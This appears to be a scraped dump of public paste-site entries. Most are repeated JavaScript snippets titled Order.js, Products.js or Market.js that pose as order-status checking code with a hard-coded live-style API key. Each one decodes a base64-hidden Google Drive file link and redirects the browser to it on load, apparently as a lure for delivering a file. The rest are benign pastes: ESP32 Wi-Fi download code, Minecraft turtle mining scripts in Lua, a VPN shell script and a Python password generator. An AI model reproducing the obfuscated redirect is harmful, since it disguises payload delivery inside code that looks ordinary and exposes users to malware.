  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sRmTnbX2,Products.js,Epiphemeral,JavaScript,Friday 4th of April 2025 02:46:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79047/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GKDYKHwz,esp-idf download,honey_the_codewitch,C,Friday 4th of April 2025 02:36:29 PM CDT,"// PUT wifi.txt ON SPIFFS
// FIRST LINE IS SSID
// NEXT LINE IS PASSWORD
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/unistd.h>

#include ""esp_event.h""
#include ""esp_http_client.h""
#include ""esp_idf_version.h""
#include ""esp_netif.h""
#include ""esp_spiffs.h""
#include ""esp_system.h""
#include ""esp_tls.h""
#include ""esp_wifi.h""
#include ""freertos/FreeRTOS.h""
#include ""freertos/event_groups.h""
#include ""freertos/task.h""
#include ""lwip/dns.h""
#include ""lwip/inet.h""
#include ""lwip/ip4_addr.h""
#include ""nvs_flash.h""

#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT BIT1

EventGroupHandle_t wifi_event_group = NULL;
size_t wifi_retry_count = 0;

esp_err_t http_event_handler(esp_http_client_event_t* evt) {
    switch (evt->event_id) {
        case HTTP_EVENT_ERROR:
            break;
        case HTTP_EVENT_ON_CONNECTED:
            break;
        case HTTP_EVENT_HEADER_SENT:
            break;
        case HTTP_EVENT_ON_HEADER:
            break;
        case HTTP_EVENT_ON_DATA:
            if (evt->user_data) {
                FILE* f = (FILE*)evt->user_data;
                // The last byte in evt->user_data is kept for the NULL
                // character in case of out-of-bound access.
                fwrite(evt->data, 1, evt->data_len, f);
            }
            break;
        case HTTP_EVENT_ON_FINISH:
            if (evt->user_data) {
                fclose((FILE*)evt->user_data);
                puts(""Download finished"");
            }
            break;
        case HTTP_EVENT_DISCONNECTED:
            int mbedtls_err = 0;
            esp_tls_get_and_clear_last_error(
                (esp_tls_error_handle_t)evt->data, &mbedtls_err, NULL);
            break;
        case HTTP_EVENT_REDIRECT:
            esp_http_client_set_header(evt->client, ""From"", ""user@example.com"");
            esp_http_client_set_header(evt->client, ""Accept"", ""text/html"");
            esp_http_client_set_redirection(evt->client);
            break;
    }
    return ESP_OK;
}
void wifi_event_handler(void* arg, esp_event_base_t event_base,
                        int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        esp_wifi_connect();
    } else if (event_base == WIFI_EVENT &&
               event_id == WIFI_EVENT_STA_DISCONNECTED) {
        if (wifi_retry_count < 3) {
            esp_wifi_connect();
            ++wifi_retry_count;
        } else {
            xEventGroupSetBits(wifi_event_group, WIFI_FAIL_BIT);
        }
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        wifi_retry_count = 0;
        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
    }
}
static void http_download(const char* url, FILE* file) {
    esp_http_client_config_t config = {
        .url = url, .event_handler = http_event_handler, .user_data = file};
    esp_http_client_handle_t client = esp_http_client_init(&config);
    ESP_ERROR_CHECK(esp_http_client_perform(client));

    esp_http_client_cleanup(client);
}

void app_main() {
  
    char ssid[65];
    ssid[0] = 0;
    char pass[129];
    pass[0] = 0;
    
    esp_vfs_spiffs_conf_t conf = {.base_path = ""/spiffs"",
                                  .partition_label = NULL,
                                  .max_files = 5,
                                  .format_if_mount_failed = true};
    ESP_ERROR_CHECK(esp_vfs_spiffs_register(&conf));
    puts(""Looking for /spiffs/wifi.txt"");
    FILE* file = fopen(""/spiffs/wifi.txt"", ""r"");
    int loaded = 0;
    if (file != NULL) {
        // parse the file
        fgets(ssid, sizeof(ssid), file);
        char* sv = strchr(ssid, '\n');
        if (sv != NULL) *sv = '\0';
        sv = strchr(ssid, '\r');
        if (sv != NULL) *sv = '\0';
        fgets(pass, sizeof(pass), file);
        fclose(file);
        file = NULL;
        sv = strchr(pass, '\n');
        if (sv != NULL) *sv = '\0';
        sv = strchr(pass, '\r');
        if (sv != NULL) *sv = '\0';
        loaded = true;
    }
    if(!loaded) {
        puts(""Put a wifi.txt file in SPIFFS. First line is SSID. Next line is password."");
        while(1) vTaskDelay(5);
    }
    nvs_flash_init();
    wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_event_handler_instance_t instance_any_id;
    esp_event_handler_instance_t instance_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
        ESP_EVENT_ANY_ID,
        &wifi_event_handler,
        NULL,
        &instance_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
        IP_EVENT_STA_GOT_IP,
        &wifi_event_handler,
        NULL,
        &instance_got_ip));
    
    wifi_config_t wifi_config;
    memset(&wifi_config,0,sizeof(wifi_config));
    memcpy(wifi_config.sta.ssid,ssid,strlen(ssid)+1);
    memcpy(wifi_config.sta.password,pass,strlen(pass)+1);
    wifi_config.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
    wifi_config.sta.sae_pwe_h2e = WPA3_SAE_PWE_BOTH;
    wifi_config.sta.sae_h2e_identifier[0]=0;
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA) );
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config) );
    ESP_ERROR_CHECK(esp_wifi_start() );
    while(1) {
        EventBits_t bits = xEventGroupGetBits(wifi_event_group)&(WIFI_CONNECTED_BIT|WIFI_FAIL_BIT);
        if(bits==WIFI_CONNECTED_BIT) {
            puts(""Connected"");
            break;
        }
        if(bits==WIFI_FAIL_BIT) {
            puts(""Unable to connect"");
            while(1) vTaskDelay(5);
        }
    }
    static const char* url =
        ""http://www.google.com/images/branding/googlelogo/1x/""
        ""googlelogo_light_color_272x92dp.png"";
    file = fopen(""/spiffs/download.png"", ""wb"");
    if (file == NULL) {
        puts(""Unable to create download file"");
        while (1) vTaskDelay(5);
    }
    http_download(url, file);
    file = fopen(""/spiffs/download.png"",""rb"");
    fseek(file,0,SEEK_END);
    size_t len = ftell(file);
    fclose(file);
    printf(""download.png is %0.2fKB\n"",((float)len)/1024.f);
}"
nWSZv3qh,Order.js,Epiphemeral,JavaScript,Friday 4th of April 2025 02:31:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67621/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N9C253jm,Market.js,Epiphemeral,JavaScript,Friday 4th of April 2025 02:15:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60107/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3km5t9WV,Untitled,Epiphemeral,JavaScript,Friday 4th of April 2025 02:00:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55875/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AzNfMYxF,Products.js,Epiphemeral,JavaScript,Friday 4th of April 2025 01:44:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04250/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nbgZqXCx,mikanianian,temposabel,Lua,Friday 4th of April 2025 01:43:20 PM CDT,"DIRECTIONS = {""north"", ""east"", ""south"", ""west""}
NORTH, EAST, SOUTH, WEST, UP, DOWN = 1, 2, 3, 4, 5, 6
DELTA = {vector.new(0, 0, -1), vector.new(1, 0, 0), vector.new(0, 0, 1), vector.new(-1, 0, 0), vector.new(0, 1, 0), vector.new(0, -1, 0)}

BLOCKS_TO_MINE = {
  [""minecraft:diamond_ore""]=true,
  [""minecraft:coal_ore""]=true
}

local start_pos = vector.new()  -- FILL IN BEFORE START
local current_direction = NORTH -- FILL IN BEFORE START
local current_pos = start_pos





function info()
  print(""-------------------------"")
  print(""XYZ:"", current_pos.x, ""/"", current_pos.y, ""/"", current_pos.z)
  print(""Facing: ""..DIRECTIONS[current_direction])
  print(""Fuel Level: ""..turtle.getFuelLevel())
  print(""-------------------------"")
end

function calculate_rotation(dir, amount)
  local d = dir - 1
  d = (d + amount) % 4
  return d + 1
end

function rotate_right(amount)
  local amount = amount or 1
  
  for i=1, amount do
    turtle.turnRight()
  end

  current_direction = calculate_rotation(current_direction, amount)
end

function rotate_left(amount)
  local amount = amount or 1

  for i=1, amount do
    turtle.turnLeft()
  end
  
  current_direction = calculate_rotation(current_direction, -amount)
end

function face(direction)
  if current_direction == direction then
    return
  elseif calculate_rotation(current_direction, 1) == direction then
    rotate_right()
  elseif calculate_rotation(current_direction, -1) == direction then
    rotate_left()
  else
    rotate_right(2)
  end
end

function move_forward(amount, dig)
  local amount = amount or 1
  local dig = dig or false
  
  for i=1, amount do
    while turtle.detect() do
      if dig then
        turtle.dig()
      else
        print(""Stepbro I'm Stuck! (in front)"")
      end
    end

    turtle.forward()
    current_pos = current_pos + DELTA[current_direction]
    info()
  end
end

function move_backward(amount, dig)
  rotate_right(2)
  move_forward(amount, dig)
  rotate_left(2)
end

function move_right(amount, dig)
  rotate_right()
  move_forward(amount, dig)
  rotate_left()
end

function move_left(amount, dig)
  rotate_left()
  move_forward(amount, dig)
  rotate_right()
end

function move_up(amount, dig)
  local amount = amount or 1
  local dig = dig or false

  for i=1, amount do
    while turtle.detectUp() do
      if dig then
        turtle.digUp()
      else
        print(""Stepbro I'm Stuck! (above)"")
      end
    end

    turtle.up()
    current_pos = current_pos + DELTA[UP]
    info()
  end
end

function move_down(amount, dig)
  local amount = amount or 1
  local dig = dig or 1

  for i=1, amount do
    while turtle.detectDown() do
      if dig then
        turtle.digDown()
      else
        print(""Stepbro I'm Stuck! (below)"")
      end
    end

    turtle.down()
    current_pos = current_pos + DELTA[DOWN]
    info()
  end
end

function go_down_to(level)
  for i=0,level do
    turtle.digDown()
    turtle.down()
  end
end

function manhattan_distance(pos1, pos2)
  return math.abs(pos1.x - pos2.x) + math.abs(pos1.y - pos2.y) + math.abs(pos1.z - pos2.z)
end

function get_available_fuel()
  local available_fuel = turtle.getFuelLevel()

  for i=1, 16 do
    local item = turtle.getItemDetail(i)

    if item and item.name == ""minecraft:coal"" then
      available_fuel = available_fuel + item.count * 80
    end
  end
  
  return available_fuel
end

function has_ore_in_vicinity()
  blocks = {}
  
  
  table.insert(select(2, blocks,turtle.inspectDown()).name)
  table.insert(select(2, blocks,turtle.inspectUp()).name)

  table.insert(select(2, blocks,turtle.inspect()).name)
  turtle.turnLeft()
  table.insert(select(2, blocks,turtle.inspect()).name)
  turtle.turnRight(2)
  table.insert(select(2, blocks,turtle.inspect()).name)
  turtle.turnLeft()

  for _, block in ipairs(blocks) do
    if BLOCKS_TO_MINE[block] ~= nil then
      return true
    end
  end
  
  return false
end

function mine_vein(depth, visited)
  local visited = visited or {}
  if depth == 0 then return end

  local local_start_dir = current_direction

  -- Forward/Backward/Left/Right
  for i=0, 3 do
    local new_dir = calculate_rotation(local_start_dir, i)
    local block = (current_pos + DELTA[new_dir]):tostring()

    if visited[block] == nil then
      visited[block] = true

      face(new_dir)

      local not_air, block_data = turtle.inspect()
      if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
        move_forward(1, true)
        mine_vein(depth - 1, visited)
        face(calculate_rotation(new_dir, 2))
        move_forward(1, true)
      end
    end
  end

  -- Up/Down
  local block = (current_pos + DELTA[UP]):tostring()
  if visited[block] == nil then
    visited[block] = true

    local not_air, block_data = turtle.inspectUp()
    if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
      move_up(1, true)
      mine_vein(depth - 1, visited)
      move_down(1, true)
    end
  end

  local block = (current_pos + DELTA[DOWN]):tostring()
  if visited[block] == nil then
    visited[block] = true

    local not_air, block_data = turtle.inspectDown()
    if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
      move_down(1, true)
      mine_vein(depth - 1, visited)
      move_up(1, true)
    end
  end

  face(local_start_dir)
end


function main()

end"
hH73ybUa,minaina,temposabel,Lua,Friday 4th of April 2025 01:39:26 PM CDT,"DIRECTIONS = {""north"", ""east"", ""south"", ""west""}
NORTH, EAST, SOUTH, WEST, UP, DOWN = 1, 2, 3, 4, 5, 6
DELTA = {vector.new(0, 0, -1), vector.new(1, 0, 0), vector.new(0, 0, 1), vector.new(-1, 0, 0), vector.new(0, 1, 0), vector.new(0, -1, 0)}

BLOCKS_TO_MINE = {
  ""minecraft:diamond_ore""= true,
}

local start_pos = vector.new()  -- FILL IN BEFORE START
local current_direction = NORTH -- FILL IN BEFORE START
local current_pos = start_pos





function info()
  print(""-------------------------"")
  print(""XYZ:"", current_pos.x, ""/"", current_pos.y, ""/"", current_pos.z)
  print(""Facing: ""..DIRECTIONS[current_direction])
  print(""Fuel Level: ""..turtle.getFuelLevel())
  print(""-------------------------"")
end

function calculate_rotation(dir, amount)
  local d = dir - 1
  d = (d + amount) % 4
  return d + 1
end

function rotate_right(amount)
  local amount = amount or 1
  
  for i=1, amount do
    turtle.turnRight()
  end

  current_direction = calculate_rotation(current_direction, amount)
end

function rotate_left(amount)
  local amount = amount or 1

  for i=1, amount do
    turtle.turnLeft()
  end
  
  current_direction = calculate_rotation(current_direction, -amount)
end

function face(direction)
  if current_direction == direction then
    return
  elseif calculate_rotation(current_direction, 1) == direction then
    rotate_right()
  elseif calculate_rotation(current_direction, -1) == direction then
    rotate_left()
  else
    rotate_right(2)
  end
end

function move_forward(amount, dig)
  local amount = amount or 1
  local dig = dig or false
  
  for i=1, amount do
    while turtle.detect() do
      if dig then
        turtle.dig()
      else
        print(""Stepbro I'm Stuck! (in front)"")
      end
    end

    turtle.forward()
    current_pos = current_pos + DELTA[current_direction]
    info()
  end
end

function move_backward(amount, dig)
  rotate_right(2)
  move_forward(amount, dig)
  rotate_left(2)
end

function move_right(amount, dig)
  rotate_right()
  move_forward(amount, dig)
  rotate_left()
end

function move_left(amount, dig)
  rotate_left()
  move_forward(amount, dig)
  rotate_right()
end

function move_up(amount, dig)
  local amount = amount or 1
  local dig = dig or false

  for i=1, amount do
    while turtle.detectUp() do
      if dig then
        turtle.digUp()
      else
        print(""Stepbro I'm Stuck! (above)"")
      end
    end

    turtle.up()
    current_pos = current_pos + DELTA[UP]
    info()
  end
end

function move_down(amount, dig)
  local amount = amount or 1
  local dig = dig or 1

  for i=1, amount do
    while turtle.detectDown() do
      if dig then
        turtle.digDown()
      else
        print(""Stepbro I'm Stuck! (below)"")
      end
    end

    turtle.down()
    current_pos = current_pos + DELTA[DOWN]
    info()
  end
end

function go_down_to(level)
  for i=0,level do
    turtle.digDown()
    turtle.down()
  end
end

function manhattan_distance(pos1, pos2)
  return math.abs(pos1.x - pos2.x) + math.abs(pos1.y - pos2.y) + math.abs(pos1.z - pos2.z)
end

function get_available_fuel()
  local available_fuel = turtle.getFuelLevel()

  for i=1, 16 do
    local item = turtle.getItemDetail(i)

    if item and item.name == ""minecraft:coal"" then
      available_fuel = available_fuel + item.count * 80
    end
  end
  
  return available_fuel
end

function has_ore_in_vicinity()
  blocks = {}
  
  
  table.insert(select(2, blocks,turtle.inspectDown()).name)
  table.insert(select(2, blocks,turtle.inspectUp()).name)

  table.insert(select(2, blocks,turtle.inspect()).name)
  turtle.turnLeft()
  table.insert(select(2, blocks,turtle.inspect()).name)
  turtle.turnRight(2)
  table.insert(select(2, blocks,turtle.inspect()).name)
  turtle.turnLeft()

  for _, block in ipairs(blocks) do
    if BLOCKS_TO_MINE[block] ~= nil then
      return true
    end
  end
  
  return false
end

function mine_vein(depth, visited)
  local visited = visited or {}
  if depth == 0 then return end

  local local_start_dir = current_direction

  -- Forward/Backward/Left/Right
  for i=0, 3 do
    local new_dir = calculate_rotation(local_start_dir, i)
    local block = (current_pos + DELTA[new_dir]):tostring()

    if visited[block] == nil then
      visited[block] = true

      face(new_dir)

      local not_air, block_data = turtle.inspect()
      if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
        move_forward(1, true)
        mine_vein(depth - 1, visited)
        face(calculate_rotation(new_dir, 2))
        move_forward(1, true)
      end
    end
  end

  -- Up/Down
  local block = (current_pos + DELTA[UP]):tostring()
  if visited[block] == nil then
    visited[block] = true

    local not_air, block_data = turtle.inspectUp()
    if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
      move_up(1, true)
      mine_vein(depth - 1, visited)
      move_down(1, true)
    end
  end

  local block = (current_pos + DELTA[DOWN]):tostring()
  if visited[block] == nil then
    visited[block] = true

    local not_air, block_data = turtle.inspectDown()
    if not_air and BLOCKS_TO_MINE[block_data.name] ~= nil then
      move_down(1, true)
      mine_vein(depth - 1, visited)
      move_up(1, true)
    end
  end

  face(local_start_dir)
end


function main()"
H00svFxn,Order.js,Epiphemeral,JavaScript,Friday 4th of April 2025 01:29:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51099/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xvz7GuPz,Untitled,asmm,Bash,Friday 4th of April 2025 01:18:38 PM CDT,"#!/usr/bin/env bash

set -e

SCRIPT=$(basename ""$0"")
SCRIPT_PATH=$(dirname ""$0"")

. ""${SCRIPT_PATH}/.vpnrc""


source ~/.venv/openconnect/bin/activate

~/.venv/openconnect/bin/openconnect-sso --server ${VPNURL} \
  --user $DOMAIN_USER \
  --authgroup $AUTH_GROUP \
  --usergroup $USERGROUP \
  -- \
  --background \
  --user=$VPNUSER \
  --authgroup=${AUTH_GROUP} \
  --non-inter \
  --script=""vpn-slice ${ROUTES}"" \
  --quiet"
9yerN9T8,Untitled,Derik_hacker,Python,Friday 4th of April 2025 01:14:07 PM CDT,"import random
import string

#random: c'est une bibliothèques qui serve per generare numeri casuali.

#string: c'est une bibliothèques contiene caratteri utili per creare una password casuale.

def generate_username(name, surname):
    return f""{name.lower()}{surname.lower()}{random.randint(100, 999)}""
    # La funzione generate_username prende il nome e il cognome dell'utente come parametro.

    #Converte entrambi in minuscolo usando .lower().

    #Aggiunge un numero casuale tra 100 e 999 con random.randint(100, 999).

    #Esempio:

    #Input / ou entrée: Nome = ""Marco"", Cognome = ""Rossi""
    #la sytanxe name.lower() converte ""Marco"" in ""marco"".
    #La sintassi surname.lower() converte ""Rossi"" in ""rossi"".
    #La sintassi random.randint(100, 999) genera un numero casuale tra 100 e 999.
    #Quindi il risultato finale sarà ""marcorossi786"" (il numero finale cambia ogni volta).

    #Output/ la sortie: marcorossi786 (il numero finale cambia ogni volta).

def generate_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

#La funzione generate_password genera una password di 8 caratteri.

#string.ascii_letters → lettere maiuscole e minuscole (A-Z, a-z). c'est a dire toutes les lettres de l'alphabet.

#string.digits → numeri (0-9). c'est a dire tous les chiffres(0,1,2,......jusqu'à 9).

#string.punctuation → ça te donne gli simboli (!@#$%^&* etc.).

#random.choice(characters) for _ in range(length) seleziona casualmente 8 caratteri. 
#c'est a dire la random.choice(characters) selezione au hasard 8 caractères dans ma variable (characters).
#exemple : characters = string.ascii_letters + string.digits + string.punctuation = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?"" 
# maintneant je vais choisir 8 caractères au hasard dans cette variable le random selectionne au hasard et le for _ in range(length) va le répéter 8 fois.

#La sintassi ''.join(...) unisce i caratteri selezionati in una stringa.

#Esempio: characters = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?""

#Output: G5&k!9qT (cambia ogni volta).



def register_user():
    name = input(""Inserisci il tuo nome: "")#on demande à l'utilisateur d'entrer son nom.
    #La fonction input() consente di acquisire l'input dell'utente.

    surname = input(""Inserisci il tuo cognome: "")#on demande à l'utilisateur d'entrer son cognome.
    #La fonction input() consente di acquisire l'input dell'utente.
    
    username = generate_username(name, surname)#on appelle la fonction generate_username pour generer le nom d'utilisateur.
    #La funzione generate_username() genera un nome utente casuale basato sul nome e sul cognome dell'utente.
    #c'est à dire le nom et le surnom qu'on a demandé à l'utilisateur d'entrer. c'est avec ça qu'on va appeler la fonction generate_username.
    #la funzione generate_username() va generer un nom d'utilisateur aléatoire basé sur le nom et le prénom de l'utilisateur.
    password = generate_password()
    #memme chose pour la fonction generate_password() qui va generer une password aléatoire de 8 caractères.
    
    print(""\nRegistrazione completata con successo!"")
    print(f""Il tuo nome utente è: {username}"")
    print(f""La tua password è: {password}"")

if __name__ == ""__main__"": #on appelle la fonction register_user() pour demarrer le programme.
    #le if n'est pas obligé mais cela evite d'appeler la fonction register_user() si on importe ce fichier dans un autre fichier.
    #c'est à dire si on importe ce fichier dans un autre fichier, la fonction register_user() ne sera pas appelée automatiquement.
    #et tes fonctions ne seront pas exécutées automatiquement. et peuvent être utilisées dans un autre fichier.
    register_user()
"
YZVDwKwm,Market.js,Epiphemeral,JavaScript,Friday 4th of April 2025 01:14:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12460/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3nymqjQG,Untitled,Epiphemeral,JavaScript,Friday 4th of April 2025 12:58:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46495/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
